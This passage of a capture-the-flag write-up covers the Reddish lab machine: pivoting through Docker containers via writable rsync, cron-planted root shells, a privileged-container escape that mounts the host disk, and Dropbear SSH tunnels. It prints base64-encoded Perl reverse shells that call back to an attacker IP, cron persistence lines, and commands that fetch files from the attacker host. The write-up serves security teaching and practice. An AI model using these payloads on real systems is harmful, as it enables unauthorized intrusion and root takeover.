root@kali# python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.10.10.94 - - [25/Jul/2018 08:32:32] "GET /socat HTTP/1.1" 200 -

```

## backup Container

### Enumeration

The backup script not only provides a path to root on www, but it also tells me about another host, backup. If I `ping -c 1 backup`, I’ll see it resolves to 127.20.0.2. I’ll upload `nmap` to www and see what’s open:

```

# ./nmap -p- --min-rate 5000 172.20.0.2

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2018-07-25 12:36 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for reddish_composition_backup_1.reddish_composition_internal-network-2 (172.20.0.2)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000034s latency).
Not shown: 65534 closed ports
PORT    STATE SERVICE
873/tcp open  rsync
MAC Address: 02:42:AC:14:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 22.23 seconds

```

It makes sense that it’s open on 873, rsync, which is how www was connecting to it.

I’ll update my diagram:

![](https://0xdfimages.gitlab.io/img/reddish-network_map-3.png)

### rsync access

`rsync` gives me full read and write access to backup. I can read the file system:

```

# rsync rsync://backup:873/src
drwxr-xr-x          4,096 2018/07/25 12:59:07 .
-rwxr-xr-x              0 2018/05/04 21:01:30 .dockerenv
-rwxr-xr-x            100 2018/05/04 19:55:07 docker-entrypoint.sh
-rw-r--r--            344 2018/07/25 12:59:07 shell
drwxr-xr-x          4,096 2018/07/15 17:42:41 backup
drwxr-xr-x          4,096 2018/07/15 17:42:39 bin
drwxr-xr-x          4,096 2018/07/15 17:42:38 boot
drwxr-xr-x          4,096 2018/07/15 17:42:39 data
drwxr-xr-x          3,720 2018/07/25 09:24:48 dev
drwxr-xr-x          4,096 2018/07/15 17:42:39 etc
drwxr-xr-x          4,096 2018/07/15 17:42:38 home
drwxr-xr-x          4,096 2018/07/15 17:42:39 lib
drwxr-xr-x          4,096 2018/07/15 17:42:38 lib64
drwxr-xr-x          4,096 2018/07/15 17:42:38 media
drwxr-xr-x          4,096 2018/07/15 17:42:38 mnt
drwxr-xr-x          4,096 2018/07/15 17:42:38 opt
dr-xr-xr-x              0 2018/07/25 09:24:48 proc
drwxr-xr-x          4,096 2018/07/25 12:59:01 rdb
drwx------          4,096 2018/07/15 17:42:38 root
drwxr-xr-x          4,096 2018/07/25 09:24:52 run
drwxr-xr-x          4,096 2018/07/15 17:42:38 sbin
drwxr-xr-x          4,096 2018/07/15 17:42:38 srv
dr-xr-xr-x              0 2018/07/25 09:24:48 sys
drwxrwxrwt          4,096 2018/07/25 13:00:01 tmp
drwxr-xr-x          4,096 2018/07/15 17:42:39 usr
drwxr-xr-x          4,096 2018/07/15 17:42:39 var

```

I can write to the file system:

```

# rsync rsync://backup:873/src/tmp/
drwxrwxrwt          4,096 2018/07/26 21:27:16 .
# rsync 0xdf rsync://backup:873/src/tmp/
# rsync rsync://backup:873/src/tmp/
drwxrwxrwt          4,096 2018/07/26 21:27:34 .
-rw-r--r--              0 2018/07/26 21:27:34 0xdf

```

### Shell via Cron

I’ll use the read / write access to verify that cron is enabled, and then write one to get shell.

There’s already a cron named `clean` in the folder, which is a good sign that cron is enabled:

```

# rsync rsync://backup:873/src/etc/cron.d/
drwxr-xr-x          4,096 2018/07/25 21:41:13 .
-rw-r--r--            102 2015/06/11 10:23:47 .placeholder
-rw-r--r--             29 2018/05/04 20:57:55 clean

```

I’ll write a cron file. First, a shell script that calls back to www on port 9010:

```

# echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTcyLjIwLjAuMyI7JHA9OTAxMDtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsnCg== | base64 -d > shell.sh 
# cat shell.sh
perl -e 'use Socket;$i="172.20.0.3";$p=9010;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
# rsync -a shell.sh rsync://backup:873/src/tmp/
# rsync rsync://backup:873/src/tmp/
drwxrwxrwt          4,096 2018/07/25 21:38:36 .
-rw-r--r--            220 2018/07/25 21:37:39 shell.sh

```

Now write the cron:

```

# echo '* * * * * root sh /tmp/shell.sh' > shell
# rsync -a shell rsync://backup:873/src/etc/cron.d/

```

Rather than tunnel everything thing back to kali, I’ll just use `socat` to listen on www in this case. That gets me a callback as root on backup:

```

# /tmp/socat TCP-LISTEN:9010 STDOUT
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# hostname
backup

```

## reddish Host

### File System Access

backup is rather bare, other than the information I already had. However, one of the mis-configurations that can come with docker is running with `--privileged`. There’s some detail on slide 20 [here](https://www.slideshare.net/BorgHan/hacking-docker-the-easy-way). That flag provides access to the raw devices in `/dev` on the host.

For example, on www, if I look at `/dev`, I see this:

```

# ls /dev
core
fd
full
mqueue
null
ptmx
pts
random
shm
stderr
stdin
stdout
tty
urandom
zero

```

But on backup, I see a lot more, including the disks:

```

# ls /dev
agpgart
autofs
bsg  
btrfs-control
bus   
...
sda
sda1
sda2
sda3
sda4
sda5
...
# ls /dev/ | wc -l
184

```

This raw device access is enough to provide file system access:

```

# mount /dev/sda1 /mnt
# ls /mnt/root/
root.txt

```
*July 2023 update: It seems the machine got updated at some point, and the partition with the host file system is now `/dev/sda2`.*

Now I can grab the flag:

```

# cat /mnt/root/root.txt
50d0db64...

```

### root Shell

With write access to `/etc/cron.d`, I can get a root shell easily. And, reddish can talk directly home, so I don’t have to make tunnels, which is nice. Write a shell script:

```

# echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTAuMTAuMTQuMTQiOyRwPTkwMTA7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307Jwo= | base64 -d > shell.sh
# cat /mnt/opt/shell.sh
perl -e 'use Socket;$i="10.10.14.14";$p=9010;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

```

Now write the cron:

```

# cd /mnt/etc/cron.d/
# ls
mdadm
popularity-contest
# echo '* * * * * root sh /opt/shell.sh' > shell 

```

Catch the callback:

```

root@kali# nc -lnvp 9010
listening on [any] 9010 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.94] 53548
/bin/sh: 0: can't access tty; job control turned off
# hostname
reddish
# whoami
root

```

## Beyond Root

### Docker Configuration

Once I have root, I like to go back and look at how things were configured. In this case, the docker configuration is interesting.

The docker configuration files are stored in `/opt/reddish_composition/`:

```

root@reddish:/opt/reddish_composition# ls
apache  docker-compose.yml  multi-nodered  redis  rsync  www

```

`docker-compose.yml` shows how the machines are run, including the shared volume between redis and www, how the networks are laid out, and that backup is running in privileged mode (`<--` comments added by me):

```

version: '3'
services:
  nodered:
    build: ./multi-nodered
    hostname: nodered
    ports:
     - "1880:1880"         <-- ports accessible from outside
    networks:
      - default
      - internal-network   <-- shared network with www/redis
    restart: always
  redis:
    build: ./redis
    hostname: redis
    volumes:
     - ./www:/var/www/html <-- shared volume with www
    networks:
     - internal-network    <-- shared network with nodered/www
    restart: always
  www:
    build: ./apache
    hostname: www
    volumes:
     - ./www:/var/www/html <-- shared volume with redis
     - /home:/home         <-- homedir with user.txt
    networks:
     - internal-network    <-- shared network with nodered/redis
     - internal-network-2  <-- shared network with backup
    restart: always
  backup:
    build: ./rsync
    hostname: backup
    volumes:
     - ./rsync/www:/backup
    networks:
     - internal-network-2  <-- shared network with www
    restart: always
    privileged: true       <-- allowed host filesystem access
networks:
  internal-network:
   internal: true          <-- these networks can't talk directly out
  internal-network-2:
   internal: true

```

Now I can update my picture of the docker network one last time:

![](https://0xdfimages.gitlab.io/img/reddish-network_map.png)

### Node-Red Collisions

When I first visit the node red site, what’s to keep me from running into other people and their flows? And, what was with the need to issue a POST request to get the url to the site? Turns out, those are related.

The code that’s running the NodeRed instance is in `/node-red/multinodered.js`:

```

// Create an Express app
var app = express();

// Add a simple route for static content served from 'public'
app.use("/",express.static("public"));

app.post('/', function(req,res) {
    var ip = (req.headers['x-forwarded-for'] ||
     req.connection.remoteAddress ||
     req.socket.remoteAddress ||
     req.connection.socket.remoteAddress).split(",")[0];

    var id = createNodeREDInstance(server, app, ip);
    res.status(200).send({"id": id, "ip": ip, 'path': "/red/{id}"});
});

```

There’s no GET for this app, which explains the error. A POST will create a new NodeRed instance and return the id, and the id is what’s sent back to us.

Inside the `createNodeREDInstance()` function I see the id is just a hash of our ip (which works out really nice when multiple HTB players are trying to use this at the same time):

```

var id = crypto.createHash('md5').update(ip).digest("hex");

```

### Creating Port Forwards with Dropbear

#### Setup

I have a dummy account on my kali box (named dummy). In `/etc/passwd`, the shell is set to `/bin/false`:

```

dummy:x:1001:1001::/home/dummy:/bin/false

```

That makes it much harder for someone who gets ahold of the key I’m about to create to do anything useful hacking into my host. If you try to `ssh` into my box as dummy, it just closes:

```

root@kali# ssh dummy@localhost
dummy@localhost's password: 
Linux kali 4.18.0-kali3-amd64 #1 SMP Debian 4.18.20-2kali2 (2018-11-30) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jan 17 06:28:18 2019 from 127.0.0.1
Connection to localhost closed.

```

I can use the `-N` flag to connect without a shell, and the `-L`, `-R`, `-D` flags to forward ports (check out my [Intro to SSH Tunneling](/2018/06/10/intro-to-ssh-tunneling.html) for more details).

#### Build Dropbear

[Dropbear](https://matt.ucc.asn.au/dropbear/dropbear.html) is a statically compiled, relatively small ssh client that I will use to connect back to my kali box from nodered. I’ll grab the source from the website. I’ll copy the file to nodered using the file upload flow or the perl command to get a file over http:

```

# perl -e 'use File::Fetch; my $url = "http://10.10.14.14/dropbear-2018.76.tar.bz2"; my $ff = File::Fetch->new(uri => $url); my $file = $ff->fetch() or die $ff->error;'

# pwd
/tmp

# ls
dropbear-2018.76.tar.bz2

```

Open the archive with `tar`:

```

# tar xjvf dropbear-2018.76.tar.bz2                                                      
dropbear-2018.76/                                                                        
dropbear-2018.76/termcodes.h                                                  
dropbear-2018.76/dbmulti.c                                                                
dropbear-2018.76/cli-runopts.c  
...[snip]...

```

Now compile the software (the container has gcc and the minimum libraries to build this):

```

# cd dropbear-2018.76/                     
# ./configure && make                  
checking for gcc... gcc                      
checking whether the C compiler works... yes
checking for C compiler default output file name... a.out
checking for suffix of executables...    
checking whether we are cross compiling... no
...[snip]...

```

#### Generate Key Pair

Next I’ll generate a key pair to use with `dropbearkey`. It’s a simple program with [only a few options](https://linux.die.net/man/8/dropbearkey). I’ll use `-t rsa` to make an RSA key pair, and `-f .k` to name the key file `.k`:

```

# ./dropbearkey -t rsa -f .k
Generating 2048 bit rsa key, this may take a while...
Public key portion is:
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCFI9K2O4PVLSLLIJw2ExqYHtPUQTrcn+GKR3BRaD8Th+5CYIPMRQF8MK29tlgjdZh5MSf5RB4tsm523hMp6879tvi0Bzc0afZ8FKfaVjTwWsG/cbNFZzi4W5PpwsLkh9vbBgXhbPfdmMdz2uLZrsmPKVKXXkg/URz9vhiQelJAL0PcysIBh3c9CkJfNzzNJ2DHxY/OugnhQlObmLfOzkucP2DtTAZjYYCpc8cByzKS7vgo8rZLscf7QrN3LLKr8SFmjSnEcqxvIC1cVOpRju3kmfJxNY4ebcod1DaQtRYXC+K2byNwf5y3z3ahhW8dWJVLEcPH0bueuRVnYk3wfrjx root@nodered
Fingerprint: sha1!! 78:53:6e:77:d8:da:ef:43:a7:c8:97:de:3c:a0:c4:d4:80:7d:f3:ab

```

Now I’ll put this public key into the authorized key file for dummy on my kali box. While this key is in that file, anyone who has the private key (`.k`) can ssh into my box, so I’ll want to leave this in place only long enough to get the tunnels set up.

#### Create Tunnel

Now I’ll use DropBear’s `dbclient` to ssh back, creating a tunnel to access the web page on www:

```

# ./dbclient -i .k -f -N -R 8888:172.19.0.4:80 dummy@10.10.14.14

```

The options I used are:
- `-i .k` - Use the keyfile I generated earlier
- `-f` - run ssh in the background
- `-N` - Done request a shell or run and commands
- `-R 8888:172.19.0.4:80` - listen on port 8888 on my kali host, and forward and traffic to 172.19.0.4 port 80. It’s important to note that my dummy user doesn’t have the privilege necessary to listen on a low port, like 80.

Now I can access the website on www:

![1547726954948](https://0xdfimages.gitlab.io/img/1547726954948.png)